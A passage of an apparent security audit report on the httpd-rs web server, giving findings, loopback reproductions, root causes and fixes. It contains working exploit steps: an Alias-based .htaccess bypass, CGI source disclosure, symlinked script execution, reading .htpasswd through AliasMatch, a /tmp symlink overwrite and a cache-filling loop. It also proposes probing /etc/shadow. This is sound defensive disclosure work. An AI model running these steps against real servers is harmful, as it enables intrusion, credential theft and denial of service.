# httpd-rs adversarial findings — Pass 4

**Target:** `HEAD 24e226d` plus the uncommitted hardening changes in the working
tree, release binary `target/release/httpd-rs` (built before testing; repository
source was not modified for this pass).

**Environment:** Linux, loopback only. Apache 2.4.69 (Debian) was used as a
differential oracle where it helps distinguish a httpd-rs bug from an
Apache-compatible behaviour. Fixtures live under `/tmp/opencode`. No external
network, IP address, or real web server was involved.

**Status of this pass:** F39, F40, F41, F42, F43 and F44 were reproduced against
the current release binary. F39 and F40 are clear Apache divergences with
security impact. F41 and F42 expose gaps in the model/regression story rather
than plain Apache divergences. F45 is a defence-in-depth observation.

## Top exploit chain (why this matters for a wallet-shaped target)

1. An administrator publishes a private file/script through the standard
   Apache single-file form `Alias /wallet "/srv/private/wallet.dat"` (or
   `Alias /app "/srv/app/index.php"`). The private directory is protected with
   `.htaccess` (`Require all denied`) or a PHP handler. A remote, unauthenticated
   `GET /wallet` or `GET /app` returns the protected bytes/source because F39
   skips the target `.htaccess` and never applies the target handler. Apache
   returns `403` or executes the script instead.
2. If the site has a symlink in a public directory to an administrative CGI or
   PHP script (a common release/current or shared-app layout), F41 executes the
   protected script even when `<Directory ...> Require all denied` and
   `<Files ...>` prohibit its direct URL.
3. If the administrator used `<Limit GET> Options -ExecCGI` to disable CGI in a
   directory, F40 ignores that Apache-valid control and still executes the
   script.
4. The repository's own adversarial fixture, which is supposed to validate the
   F31 alias fix, exposes its `.htpasswd`, its `WALLET-REWRITE-SECRET`, and its
   full configuration through a capture-only `AliasMatch` (F42).

## Findings at a glance

| ID | Severity | Area | Demonstrated impact | Preconditions |
|---|---|---|---|---|
| F39 | Critical | single-file `Alias` | `.htaccess` auth bypass; CGI/PHP source disclosure | standard Apache-valid `Alias` to a file |
| F40 | High | `<Limit>` main config | `Options -ExecCGI` ignored; CGI executes; `Options -Indexes` ignored; listing leaks | Apache-valid `Options`/handler inside `<Limit>` |
| F41 | High | CGI/FastCGI symlink target | protected script executes via public symlink | existing symlink in an allowed directory |
| F42 | High | capture-only `AliasMatch` | read `ServerRoot` files (repo fixture leaks `.htpasswd`) | capture-only `AliasMatch`; Apache-compatible caveat |
| F43 | Medium | FastCGI spool | local symlink overwrite of server-writable files | local `/tmp` write + predictable name |
| F44 | Medium | disk cache | remote cache-partition disk exhaustion | cache enabled with a broad prefix |

Why the existing benchmark does not catch these: its alias scenario
(`bench/feature_bench.py` and `tests/conformance.py:781`) uses a directory
alias, not the single-file form; its `<Limit>` scenarios use `Require`, not
`Options`; its symlink tests use static files, not CGI/FastCGI; the FastCGI
benchmark response is far below the 1 MiB spool threshold; and the cache test
uses a single path rather than unique query strings.

---

# F39. Critical: a single-file `Alias` skips the target's `.htaccess` and serves the target as static source

## Impact

A prefix `Alias` whose target is a **regular file** (not a directory) is mapped
by `map_path()` as:

```rust
let rel = PathBuf::from(rest.trim_start_matches('/'));
return Some((a.fs_path.clone(), rel, a.script));
```

When the request URL is exactly the alias prefix, `rest` is empty, so `rel` is
empty and `root` is the target file itself. Two security consequences follow:

1. **`.htaccess` in the target directory is never read** when the alias target
   is outside `DocumentRoot`. `access_root_for()` returns the alias target
   `PathBuf` itself for a file target; `collect_layers()` then compares the
   target's parent directories with `dir.starts_with(&root)` and skips every
   one of them. A `.htaccess` containing `Require all denied`, `<Files>` rules,
   `Options`, headers, or rewrite/auth rules is therefore silently ignored for
   `/alias`.
2. **Handler and MIME selection use an empty basename.** `dispatch_inner()`
   computes `name = rel.file_name()...`; with `rel` empty, `name` is `b""`.
   `effective_handler(scope, b"")`, `cgi::is_cgi(..., b"", ...)` and
   `fastcgi::handler_target(..., &rel, ...)` do not see the target's real
   filename or extension. A `.cgi`/`.php` target configured with
   `AddHandler cgi-script`, `SetHandler`, or a FastCGI handler is not
   dispatched as a script. It is served as a static file, disclosing its
   source.

Both behaviours were reproduced against the current release binary. Apache
returns `403` for the `.htaccess`-protected target and executes the CGI target;
httpd-rs returns the protected body/source with `200`. The bypass is
specifically the `.htaccess` layer; a matching main-configuration `<Directory>`
deny still applies (the PoC therefore uses `.htaccess`, which is the common
shared-hosting control, and no broader `<Directory>` deny).

## Reproduction A: `.htaccess` authorization bypass (arbitrary protected file read)

```sh
D=/tmp/opencode/p4-alias-static
rm -rf "$D"; mkdir -p "$D/www" "$D/private"
printf 'WALLET-PRIVATE-STATIC-SECRET\n' > "$D/private/wallet.dat"
printf 'Require all denied\n' > "$D/private/.htaccess"

cat > "$D/httpd.conf" <<EOF
ServerRoot "$D"
Listen 127.0.0.1:19115
ServerName localhost
DocumentRoot "$D/www"
<Directory "$D/www">
  AllowOverride All
  Require all granted
</Directory>
<Directory "$D/private">
  AllowOverride All
</Directory>
Alias /wallet "/$D/private/wallet.dat"
EOF

./target/release/httpd-rs -f "$D/httpd.conf" -X &
curl -i http://127.0.0.1:19115/wallet
```

Observed:

```text
HTTP/1.1 200 OK
Content-Length: 29

WALLET-PRIVATE-STATIC-SECRET
```

The same configuration under Apache 2.4.69 returns:

```text
HTTP/1.1 403 Forbidden
```

Apache's error log says `client denied by server configuration:
.../private/wallet.dat`, proving that Apache evaluates the target directory's
`.htaccess` even though the URL is `/wallet`.

## Reproduction B: CGI source disclosure instead of execution

```sh
D=/tmp/opencode/p4-alias-cgi
rm -rf "$D"; mkdir -p "$D/www" "$D/private"
cat > "$D/private/secret.cgi" <<'EOF'
#!/bin/sh
# WALLET-SOURCE-PASSWORD=hunter2
printf 'Content-Type: text/plain\r\n\r\n'
printf 'EXECUTED\n'
EOF
chmod 755 "$D/private/secret.cgi"

cat > "$D/httpd.conf" <<EOF
ServerRoot "$D"
Listen 127.0.0.1:19118
ServerName localhost
DocumentRoot "$D/www"
AddHandler cgi-script .cgi
Options +ExecCGI +FollowSymLinks
Alias /run "/$D/private/secret.cgi"
EOF

./target/release/httpd-rs -f "$D/httpd.conf" -X &
curl -i http://127.0.0.1:19118/run
```

Observed from httpd-rs:

```text
HTTP/1.1 200 OK
Content-Length: 109

#!/bin/sh
# WALLET-SOURCE-PASSWORD=hunter2
printf 'Content-Type: text/plain\r\n\r\n'
printf 'EXECUTED\n'
```

Observed from Apache with the equivalent configuration:

```text
HTTP/1.1 200 OK
Content-Type: text/plain

EXECUTED
```

The same path applies to `.php` targets with a `<FilesMatch>` `SetHandler`,
`AddHandler` or FastCGI handler: `name` is empty, so
`effective_handler()`/`fastcgi::handler_target()` do not match the target
extension and the PHP source is served.

A `ScriptAlias` to a single file is affected by the same `rel` problem, but
fails closed with `500` instead of serving source:

```text
httpd-rs: CGI worker failed: cannot reopen CGI script
.../private/secret.cgi/: Not a directory (os error 20)
```

`cgi::execute()` computes `ctx.root.join(ctx.script_rel)`; with `root` set to
the target file and `script_rel` empty, the join produces a path with a
trailing slash. The target `.htaccess` is still skipped in this case.

## Root cause

1. `crates/server/src/server.rs:2670-2676` — prefix `Alias` returns the target
   as `root` and the URL remainder as `rel`; an exact URL match gives an empty
   `rel` even when the target is a file.
2. `crates/server/src/htaccess.rs:241-269` — `access_root_for()` returns
   `alias.fs_path` directly. For a file target this is the file, not its
   directory, so every `dir.starts_with(&root)` test fails and no `.htaccess`
   layer is collected.
3. `crates/server/src/server.rs:2321, 2343, 2359` — handler/MIME selection uses
   `rel.file_name()` rather than the resolved target basename. With empty
   `rel`, `${target}.cgi`/`.php` is not recognized.

The dispatcher's normal static path does re-authorize the opened target through
`fd_path()` and `bind_target_grant()`; the handler path is selected before that
point, and the `.htaccess` walk never sees the target directory.

This `.htaccess` part is a **regression introduced by the working-tree F22
hardening**. `HEAD`'s access-file walker admitted the start directory:

```rust
if !can_read_access || !(dir.starts_with(&root) || dir == start) {
    continue;
}
```

The working tree added `access_root_for()` (which returns the alias target file
for a single-file alias) and replaced the condition with
`if !can_read_access || !dir.starts_with(&root) { continue; }`. For a directory
alias this is the correct stricter containment; for a single-file alias the
root is the file, `start` is its parent, and the target's own directory is
excluded. Directory aliases were fixed correctly; single-file aliases were
left with a root that is a file. The handler/source-disclosure part of F39 is
present in `HEAD` as well; the `.htaccess` skip is specific to the uncommitted
F22 change, so both the committed baseline and the tested working tree are
affected by the overall finding (with the `.htaccess` bypass additionally
present in the working tree).

## Remediation

* In `map_path()`, treat a prefix alias whose target is a regular file as
  `(target.parent(), target.file_name(), script)` rather than
  `(target, "", script)`. This fixes handler dispatch, MIME selection,
  `SCRIPT_FILENAME` and `PATH_INFO` handling. Keep `(target, "")` only for
  directory targets. This change alone does **not** fix the access-file walk,
  because `access_root_for()` still matches on the stored `alias.fs_path`, so
  both changes are required.
* In `access_root_for()`, if the matched alias target is a regular file (or any
  non-directory), use its parent as the access-file walk root. Alternatively
  store a separate `alias.access_root` at configuration time and use it for
  both the walk and the mapping.
* Independently, derive the handler/MIME name from `fs_path.file_name()` in
  `dispatch_inner()`, so an empty/odd `rel` can never turn a script into a
  static file.
* Add differential tests for `Alias /x /path/file.cgi` and
  `Alias /x /path/file.txt` with `.htaccess` denies, `Options +ExecCGI` and
  `AddHandler`/`SetHandler`, plus a `ScriptAlias` to a single file.

The current conformance and feature matrices only exercise a directory alias
(`Alias /alias/ ".../alias-target/"` at `tests/conformance.py:781`); the
single-file form is the untested standard Apache variant that exposes this
class.

---

# F40. High: security directives inside `<Limit>` are accepted and ignored in the main configuration

## Impact

`crates/server/src/config.rs:3078-3087` contains:

```rust
if limit.is_some() && !matches!(name, "require" | "order" | "allow" | "deny" | "satisfy") {
    // Apache accepts these directives inside <Limit> but they have no
    // method-scoped meaning.  Ignore them rather than rejecting a
    // configuration Apache accepts.
    self.warn(...);
    return;
}
```

Apache does accept these directives inside `<Limit>` and **applies them**. The
blanket warning-and-ignore therefore accepts a configuration whose security
control Apache enforces and then runs without that control. This is the same
class as F36 (a request-mutating/security directive silently discarded), but in
the main configuration and with a direct remote-execution case.

### Impact A: `Options -ExecCGI` is ignored, so a disabled CGI still executes

```sh
D=/tmp/opencode/p4-limit-execcgi
rm -rf "$D"; mkdir -p "$D/www/private"
cat > "$D/www/private/script.cgi" <<'EOF'
#!/bin/sh
printf 'Content-Type: text/plain\r\n\r\n'
printf 'WALLET-EXECCGI-BYPASS\n'
EOF
chmod 755 "$D/www/private/script.cgi"

cat > "$D/httpd.conf" <<EOF
ServerRoot "$D"
Listen 127.0.0.1:19123
ServerName localhost
DocumentRoot "$D/www"
AddHandler cgi-script .cgi
<Directory "$D/www">
  Options +ExecCGI +FollowSymLinks
  Require all granted
</Directory>
<Directory "$D/www/private">
  <Limit GET>
    Options -ExecCGI
  </Limit>
</Directory>
EOF

./target/release/httpd-rs -f "$D/httpd.conf" -X &
curl -i http://127.0.0.1:19123/private/script.cgi
```

httpd-rs logs:

```text
httpd-rs: ...:12: directive 'options' inside <Limit> is ignored
```

and returns:

```text
HTTP/1.1 200 OK

WALLET-EXECCGI-BYPASS
```

Apache with the identical configuration returns:

```text
HTTP/1.1 403 Forbidden
```

and its CGI error log says `Options ExecCGI is off in this directory`. An
administrator can therefore explicitly disable CGI for a directory using an
Apache-valid configuration and httpd-rs still executes the script.

### Impact B: `Options -Indexes` is ignored, so directory listings remain enabled

With `Options +Indexes` inherited from `/www` and
`<Limit GET> Options -Indexes </Limit>` on `/www/private`, httpd-rs returns a
`200` autoindex listing containing `secret.txt`; Apache returns `403` and logs
the `Options -Indexes` denial. This discloses filenames that the administrator
tried to hide.

`Header`, `AddHandler` and `SetHandler` inside `<Limit>` are also accepted by
Apache (`apache2 -t` says `Syntax OK` in each case) and are ignored by httpd-rs.
A handler directive there can turn an intended script into a source-disclosing
static file; a `Header` directive there can silently remove a security header.

## Root cause

The allow-list of method-scoped directives is treated as an allow-list of
directives that are safe to ignore. The comment assumes Apache gives these
directives no meaning inside `<Limit>`; the Apache differential above shows the
opposite for `Options` (and Apache accepts handlers/headers there too). A
recognized directive that changes access or response policy must be applied or
rejected, never warned-and-ignored.

## Remediation

* Apply `Options`, `Header`, `AddHandler`, `SetHandler` and the other
  Apache-accepted directives inside `<Limit>` unconditionally to the enclosing
  scope (matching Apache's observed behaviour), or
* reject them at configuration time with a clear error rather than starting
  with a weakened policy.
* Add `config_semantics.py` cases for `Options -ExecCGI`, `Options -Indexes`,
  `Header` and `SetHandler` inside `<Limit>`, comparing Apache's effective
  behaviour, not only config acceptance.

---

# F41. High: CGI/FastCGI handler dispatch runs before symlink-target reauthorization

## Impact

For ordinary static files, httpd-rs re-authorizes the **actual opened target**
when it differs from the URL-mapped path:

```rust
let actual_path = crate::files::fd_path(&file).unwrap_or_else(|| fs_path.clone());
let (target_grant, target_resource, target_scope) =
    bind_target_grant(... &fs_path, &actual_path, ...)?;
```

`bind_target_grant()` re-evaluates `<Directory>`, `<Files>` and `.htaccess`
policy for `actual_path` and binds the grant to the opened inode. The
`Target::File` arm performs the FastCGI and CGI handler checks **before** this
call (and before the static `serve_file()` call):

```rust
if let Some(target) = fastcgi::handler_target(&scope, &root, &rel, &url_path) { ... }
if cgi::is_cgi(cfg, &scope, name, script_alias) { ... }
...
let actual_path = crate::files::fd_path(&file)...;
let (target_grant, ...) = bind_target_grant(...);
```

`run_cgi()` then checks the grant for the **lexical** resource and binds the
file inode, but it does not re-evaluate policy for `fd_path(file)`.
`run_fastcgi()` explicitly re-authorizes `target.script_filename`, which is also
the lexical path built by `fastcgi::script_from_prefix()`/`split_path_info()`.
A symlink inside an allowed directory to a script in a denied directory is
therefore executed using the allowed directory's policy.

This defeats `<Directory ...>`/`<Files ...>` rules and `.htaccess` denies in
the target directory. The project's own static-file behaviour (`403` for the
protected symlink) shows that this is not the intended model.

## Reproduction A: CGI

```sh
D=/tmp/opencode/p4-symlink-cgi
rm -rf "$D"; mkdir -p "$D/www/public" "$D/www/private"
cat > "$D/www/private/admin.cgi" <<'EOF'
#!/bin/sh
printf 'Content-Type: text/plain\r\n\r\n'
printf 'WALLET-ADMIN-CGI-SECRET\n'
EOF
chmod 755 "$D/www/private/admin.cgi"
ln -s ../private/admin.cgi "$D/www/public/link.cgi"

cat > "$D/httpd.conf" <<EOF
ServerRoot "$D"
Listen 127.0.0.1:19105
ServerName localhost
DocumentRoot "$D/www"
AddHandler cgi-script .cgi
<Directory "$D/www">
  Options +ExecCGI +FollowSymLinks
  Require all granted
</Directory>
<Directory "$D/www/private">
  Require all denied
</Directory>
<Files "admin.cgi">
  Require all denied
</Files>
EOF

./target/release/httpd-rs -f "$D/httpd.conf" -X &
curl -i http://127.0.0.1:19105/private/admin.cgi     # 403
curl -i http://127.0.0.1:19105/public/link.cgi       # 200 secret
curl -i http://127.0.0.1:19105/public/link.cgi/foo   # 200 secret
```

Observed:

```text
/private/admin.cgi       -> 403 Forbidden
/public/link.cgi         -> 200 WALLET-ADMIN-CGI-SECRET
/public/link.cgi/anything-> 200 WALLET-ADMIN-CGI-SECRET
```

Both the `<Directory>` deny and the `<Files "admin.cgi">` deny are bypassed
because the URL basename is `link.cgi` and the target policy is never evaluated
for the symlink target.

## Reproduction B: FastCGI/PHP-FPM route

A mock FastCGI responder was used to record the `SCRIPT_FILENAME` parameter and
return the contents of that file:

```sh
D=/tmp/opencode/p4-symlink-fcgi
rm -rf "$D"; mkdir -p "$D/www/public" "$D/www/private"
printf '<?php /* WALLET-PRIVATE-PHP-SECRET */ ?>\n' > "$D/www/private/secret.php"
ln -s ../private/secret.php "$D/www/public/link.php"
python3 /tmp/opencode/fcgi-mock.py "$D/fcgi.sock" &
cat > "$D/httpd.conf" <<EOF
ServerRoot "$D"
Listen 127.0.0.1:19104
ServerName localhost
DocumentRoot "$D/www"
ProxyPassMatch ^/(.*\.php(/.*)?)$ "unix:$D/fcgi.sock|fcgi://localhost$D/www/"
<Directory "$D/www">
  Require all granted
</Directory>
<Directory "$D/www/private">
  Require all denied
</Directory>
EOF
./target/release/httpd-rs -f "$D/httpd.conf" -X &
curl -i http://127.0.0.1:19104/public/link.php
curl -i http://127.0.0.1:19104/private/secret.php
```

Observed:

```text
/public/link.php -> 200, X-Script-Filename: .../www/public/link.php
                    (body: the private secret.php source/content)
/private/secret.php -> 403 Forbidden
```

The FastCGI backend receives the **lexical symlink path** and resolves it to the
protected file. A real PHP-FPM responder executes the protected PHP file even
though `<Directory .../private> Require all denied` was never evaluated for it.

## Root cause

* `crates/server/src/server.rs:2343-2378` — handler checks happen before
  `bind_target_grant()` at `2421`.
* `crates/server/src/server.rs:2949-2981` — `run_cgi()` binds the inode but does
  not re-evaluate policy for `fd_path(file)`.
* `crates/server/src/server.rs:2829-2879` — `run_fastcgi()` authorizes the
  lexical `target.script_filename`; `split_path_info()` returns lexical
  candidates and only checks symlink containment, not the target policy.
* `crates/server/src/cgi.rs:70-107` — `find_script_checked()` returns
  `rel_script` (lexical prefix) and the opened file; the actual path is not
  carried into the authorization decision.

## Remediation

* Bind/re-authorize the actual target before dispatching any handler. Move the
  `bind_target_grant()` call before the FastCGI/CGI checks, and pass the
  resulting `target_grant`/`target_scope` to `run_cgi()`/`run_fastcgi()`.
* For FastCGI routes that do not open the script until the backend, open it
  with `openat2(RESOLVE_BENEATH)` (or use the existing `contained_after_
  resolving_symlinks` result), obtain the actual path/inode, re-evaluate policy,
  and bind the grant to that path before sending `SCRIPT_FILENAME`.
* Carry the actual path through `ScriptTarget`/`Target` instead of only the
  lexical `rel_script`/`script_filename`.
* Add tests with a symlink in an allowed directory to a CGI and a FastCGI
  script in a `<Directory Require all denied>` directory, both direct and with
  `PATH_INFO`, asserting the same `403` as the static symlink case.

**Caveat:** Apache 2.4.69 also executes a symlinked CGI (it returned `200` in
the same CGI test). This finding is therefore an inconsistency in httpd-rs's
own documented symlink re-authorization model (and a real FastCGI/PHP policy
bypass) rather than a universal Apache differential. If Apache compatibility
is preferred, the static symlink hardening and its conformance test should be
revisited so the model is consistent; otherwise the handler paths need the same
actual-target gate as static files.

---

# F42. High: capture-only `AliasMatch` admits absolute targets under `ServerRoot`; the repository's own regression fixture leaks `.htpasswd`

## Impact

`Alias::regex()` derives the stable alias base from the replacement prefix
before the first `$`. For a capture-only replacement such as `$1`, the prefix is
empty, so the base becomes `ServerRoot`:

```rust
let cut = target_template.find('$').unwrap_or(target_template.len());
let prefix = &target_template[..cut];          // "" for "$1"
let mut root = PathBuf::from(prefix);
...
let root = if root.is_absolute() { root } else { server_root.join(root) };
```

`map_path()` then admits any expanded absolute target that is
`path_under_base(target, ServerRoot)`. `ServerRoot` commonly contains the
server configuration, `.htpasswd`, TLS private keys, and application files, so
this is an arbitrary-file-read primitive within the server's configuration
tree. The pass-3 F31 fix only moved the fallback from `target.parent()` to
`ServerRoot`; it did not eliminate the capture-only escape.

The repository's own `tests/adversarial_regressions.py` contains exactly this
alias and puts `.htpasswd` under `ServerRoot`:

```python
# tests/adversarial_regressions.py:208
f"""ServerRoot "{cls.base}"
...
# tests/adversarial_regressions.py:301
AliasMatch "^/escape(.*)$" "$1"
```

A live instance started by `F23ToF38Tests.setUpClass()` was queried with:

```python
import importlib.util, pathlib, sys
spec = importlib.util.spec_from_file_location(
    "adv", pathlib.Path("tests/adversarial_regressions.py").resolve())
mod = importlib.util.module_from_spec(spec); sys.modules["adv"] = mod
spec.loader.exec_module(mod)
cls = mod.F23ToF38Tests
cls.setUpClass()
try:
    for rel in [".htpasswd", "rewrite-secret.txt", "vp.conf"]:
        st, headers, body = mod.request(cls.port, f"/escape{cls.base}/{rel}")
        print(rel, st, repr(body[:80]))
finally:
    cls.tearDownClass()
```

Observed:

```text
.htpasswd         -> 200 b'alice:{SHA}pXcenXUnxGz6jD4dFmSXV63E49g=\n'
rewrite-secret.txt -> 200 b'WALLET-REWRITE-SECRET\n'
vp.conf            -> 200 b'ServerRoot "/tmp/opencode/httpd-rs-adversarial-..." ...'
```

The same request in a minimal deployment also reads a `ServerRoot` secret:

```sh
D=/tmp/opencode/p4-aliascheck
mkdir -p "$D/www"
printf 'WALLET-SERVERROOT-SECRET\n' > "$D/rootsecret.txt"
printf 'alice:$apr1$...\n' > "$D/.htpasswd"
cat > "$D/httpd.conf" <<EOF
ServerRoot "$D"
Listen 127.0.0.1:19100
ServerName localhost
DocumentRoot "$D/www"
AliasMatch "^/escape(.*)$" "\$1"
EOF
./target/release/httpd-rs -f "$D/httpd.conf" -X &
curl -i "http://127.0.0.1:19100/escape$D/rootsecret.txt"
curl -i "http://127.0.0.1:19100/escape$D/.htpasswd"
```

Both return `200` with the file body. A request for a path outside
`ServerRoot` (`/escape/etc/passwd`) correctly returns `404`, which is why the
pass-3 F31 regression only checks the outside case.

## Why this matters even though Apache behaves similarly

Apache 2.4.69 with the same capture-only `AliasMatch` also serves
`/escape<ServerRoot>/.htpasswd` (`200`), so this is not an Apache differential.
It is, however, a direct failure of the project's stated containment model
(`resolved_target ∈ configured_base`): `ServerRoot` is not a directory that
should be served, and the file is exposed by an alias the repository itself
uses in its adversarial regression suite. The fixture's `.htpasswd` is the
credential store for the F38 test, and `vp.conf` contains the whole test
configuration.

## Remediation

* Treat a capture-only/leading-capture `AliasMatch` as having **no base**. If
  the expanded target is absolute, reject the mapping (`None`) unless the
  template has an explicit stable directory prefix. Do not substitute
  `ServerRoot` for an empty prefix.
* Alternatively, require the operator to write an explicit base such as
  `/srv/private/$1`; reject `"$1"` and `"$1/..."` at configuration time.
* Add regression tests for `/escape<ServerRoot>/...` and for a capture-only
  alias when `ServerRoot` contains `.htpasswd`/keys. The current
  `test_f31_capture_only_alias_cannot_re_root_outside_its_base` is insufficient.

---

# F43. Medium: the FastCGI spool file uses a predictable `/tmp` name without `O_EXCL`

## Impact

`crates/server/src/fastcgi.rs:516-531` creates the spool file used for FastCGI
stdout above 1 MiB with:

```rust
let path = std::env::temp_dir()
    .join(format!("httpd-rs-fastcgi-{}-{}.body", std::process::id(), n));
let file = OpenOptions::new()
    .create(true)
    .truncate(true)
    .read(true)
    .write(true)
    .open(&path)?;
let _ = std::fs::remove_file(&path);
```

The path is predictable (PID and a process-local counter), the open follows a
pre-created symlink, and the file is truncated. A local user who can write a
symlink name in the shared temporary directory can make the server truncate and
overwrite any file writable by the server account with the FastCGI response
body. If the front PHP/CGI application reflects request data, the response body
is attacker-influenced; overwriting a webroot `.php` file is a webshell
primitive. This is the same CWE-377/CWE-59 class that the request-body spool in
`http.rs` correctly fixed with `create_new` + `mode(0o600)`, but the FastCGI
spool was not migrated.

## Reproduction

A local mock FastCGI responder returns the contents of the requested
`SCRIPT_FILENAME` inside a 1.1 MiB response whose first bytes are
`Content-Type: application/octet-stream`, followed by the file bytes (the mock
is a ~60-line Python FCGI responder; the important part is that the response
crosses the 1 MiB spool threshold). A symlink is pre-created at the predicted
path:

```sh
D=/tmp/opencode/p4-fcgi-spool
rm -rf "$D"; mkdir -p "$D/www"
python3 -c 'open("'$D'/www/large.php","wb").write(b"A"*(1100*1024))'
printf 'ORIGINAL TARGET CONTENT\n' > /tmp/opencode/p4-overwrite-target

cat > "$D/httpd.conf" <<EOF
ServerRoot "$D"
Listen 127.0.0.1:19116
ServerName localhost
DocumentRoot "$D/www"
ProxyPassMatch ^/(.*\.php)$ "unix:$D/sock|fcgi://localhost$D/www/"
<Directory "$D/www">
  Require all granted
</Directory>
EOF

python3 /tmp/opencode/fcgi-mock-large.py "$D/sock" &
./target/release/httpd-rs -f "$D/httpd.conf" -X &
PID=$!                         # server pid
ln -s /tmp/opencode/p4-overwrite-target \
      "/tmp/httpd-rs-fastcgi-$PID-0.body"
curl -sS -o /dev/null "http://127.0.0.1:19116/large.php"
```

After the request the target is 1,126,442 bytes and begins:

```text
Content-Type: application/octet-stream\r\n\r\nAAAA...
```

The symlink name was consumed by `temp_file()`; the original file was truncated
and overwritten as the server account.

## Preconditions and severity

The attacker needs local write access to the temporary directory to plant the
symlink, plus knowledge of the server PID and the next spool counter. Both are
trivially observable in a shared host. Without an echo endpoint the body
content is application-controlled, but a local attacker can often find an
endpoint that reflects a parameter or choose a file where the header prefix is
harmless. This is a local privilege escalation from any local user to the
httpd-rs account, and a website compromise in multi-tenant deployments.

## Remediation

Use the same helper as `http.rs`:

* `create_new(true)` / `O_EXCL`, mode `0o600`, bounded collision retries, and
  unlink immediately after open; or a random name from a CSPRNG.
* Never use `create(true).truncate(true)` on a predictable path in a shared
  temporary directory.
* Add a unit/integration test that pre-creates a symlink at the predicted name
  and asserts the target is untouched.

---

# F44. Medium: on-disk cache entries have no total quota or expiry cleanup; unique URLs fill the cache partition

## Impact

`crates/server/src/cache.rs` bounds the in-memory map with `MAX_ENTRIES = 4096`,
but `disk_store()` writes a `.body` and `.meta` file for every unique cache key
and there is no total-byte or entry limit on the on-disk cache. Expired entries
are removed from the in-memory list in `lookup()`; `disk_load()` rejects them,
but the files remain on disk. `clear()`/reload is the only full cleanup.

A remote client can request a cache-enabled static resource with a unique query
string for every request:

```sh
D=/tmp/opencode/p4-cache-disk
rm -rf "$D"; mkdir -p "$D/www/cache" "$D/cache"
printf 'cache body\n' > "$D/www/cache/file.txt"
cat > "$D/httpd.conf" <<EOF
ServerRoot "$D"
Listen 127.0.0.1:19127
ServerName localhost
DocumentRoot "$D/www"
CacheRoot "$D/cache"
CacheEnable disk /cache/
CacheDefaultExpire 600
<Directory "$D/www">
  Require all granted
</Directory>
EOF
chmod 777 "$D/cache"
./target/release/httpd-rs -f "$D/httpd.conf" -X &

for i in $(seq 1 5); do
  curl -sS -o /dev/null "http://127.0.0.1:19127/cache/file.txt?nonce=$i"
done
find "$D/cache" -type f | wc -l
```

Observed: 5 requests created 10 files (one `.body` and one `.meta` per key).
With `CacheEnable disk /`, `CacheDefaultExpire 600`, and no query-string
ignoring, an attacker can stream unique requests and fill the cache filesystem.
This is a remote disk-exhaustion DoS; if `CacheRoot` is on the same filesystem
as `/tmp` or logs, it also affects unrelated services.

The same test fixture is used by `tests/adversarial_regressions.py` with
`CacheEnable disk /` and a temporary `CacheRoot`, so a remote client can fill
the test host's `/tmp/opencode` tree.

## Remediation

* Track total on-disk bytes and enforce `CacheMaxFileSize`/a total quota; evict
  oldest entries (LRU) and remove both body and meta files.
* Delete expired disk files during lookup/eviction instead of only rejecting
  them.
* Cap the number of per-key variants and the number of keys on disk, not only
  in memory.
* If `CacheIgnoreQueryString` is off, unique query strings are a cheap
  amplification vector; document and bound it.

---

# F45. Low: expression file tests ignore the `confined_expr_path()` boundary

## Impact

`crates/server/src/expr.rs:411-439` documents that expression file arguments
are confined beneath the canonical document root:

```text
Resolve an expression file argument beneath the document root. `.htaccess`
authors can use `Require expr`/`RewriteCond expr`; allowing absolute or
parent-relative paths there would let a local author read files ...
```

`file()` and `filesize()` use `confined_expr_path()` correctly. The
`Expr::FileTest` arm (`expr.rs:510-537`) does not:

```rust
let raw = e.eval(ctx)?.string();
let p = PathBuf::from(&raw);
let p = if p.is_absolute() { p } else { ctx.docroot.join(p) };
let meta = std::fs::symlink_metadata(&p);
```

An absolute path is accepted and followed for `-f`, `-d`, `-e`, `-s`, `-l`
and `-F`. A `.htaccess` author (or a `<If>` condition) can therefore test the
existence/type/size of arbitrary files readable by the server account, and a
symlink inside the document root can redirect the test outside the root. This
is metadata disclosure rather than content disclosure, but it contradicts the
stated confinement and enables branch-oracle attacks from a writable
`.htaccess`.

## Remediation

* Reuse `confined_expr_path(ctx, &raw, true)` for `Expr::FileTest`, or reject
  absolute paths and `ParentDir` components in `.htaccess`/per-directory
  expressions.
* Canonicalize symlinks and require the canonical target to remain beneath
  `ctx.docroot` (as `file()` already does).
* Add tests for `-f /etc/passwd`, `-s /etc/shadow`, and a symlink escaping the
  document root from `.htaccess`.

---

# Additional review targets (not fully exploited in this pass)

* `Require not valid-user` loses its negation in `parse_require()`
  (`crates/server/src/config.rs:5505`): the `negate` variable is not carried
  into `Require::ValidUser`. Apache's `not` is supposed to negate the provider.
  A configuration that relies on this form can invert its intended access
  decision. (A quick Apache/httpd-rs comparison showed both allow an
  authenticated user in the tested `<RequireAll>` shape, so this was not
  promoted to a demonstrated bypass.)
* `sanitize_header_value()` rejects only CR, LF and NUL. CGI/proxy header
  values containing other control bytes (for example `0x0b`/`0x0c`) pass the
  final serializer. This is not CRLF splitting, but it is a downstream-parser
  divergence worth tightening.
* `apply_connection_tokens()` lets a later `keep-alive` token override an
  earlier `close` token (`close, keep-alive` keeps the connection). A
  front-end/back-end that disagree on which token wins can desynchronize
  connection reuse; this should be `close`-wins.
* The HTTP/2 mmap fast path (`h2.rs:390-410`) maps files that are writable by
  a user other than the server euid and only rejects files writable by the
  server itself. A concurrent truncate by a different owner can raise
  `SIGBUS` and terminate the process. `mmap_read_allowed()` should also reject
  files writable by anyone other than the server, or avoid mmap for
  attacker-owned files.
* `CacheIgnoreQueryString On` removes the query from both the key and the
  fingerprint but the request query can still affect CGI response content.
  This is an explicit directive, but it is a cross-query representation leak
  when used with query-driven scripts.

---

# Proposed model/invariant updates

Following the naming style in `docs/config-semantics.md`:

* **I35 `alias_file_target_split`:** if a prefix `Alias`/`ScriptAlias` target is
  a regular file, the resolved mapping is `(target.parent(), target.file_name())`;
  `rel` is never empty for a file target.
* **I36 `alias_file_access_root`:** the access-file walk root for a file target
  is its parent directory, not the target file.
* **I37 `handler_from_resolved_target`:** handler, MIME and FastCGI script
  selection use the resolved target basename, never the URL remainder.
* **I38 `limit_directive_effect`:** a directive accepted inside `<Limit>` must
  either be applied as Apache applies it or rejected; it may not be
  warn-and-ignored if it changes options, headers, handlers or filters.
* **I39 `cgi_actual_target_policy`:** CGI/FastCGI dispatch re-authorizes the
  opened/resolved actual path and binds the grant to that inode/path before
  execution or backend forwarding.
* **I40 `capture_only_alias_base`:** a capture-only/leading-capture
  `AliasMatch` has no implicit `ServerRoot` base; absolute expanded targets are
  rejected unless the operator supplied an explicit stable directory prefix.
* **I41 `temp_file_exclusive`:** every spool/temporary file uses
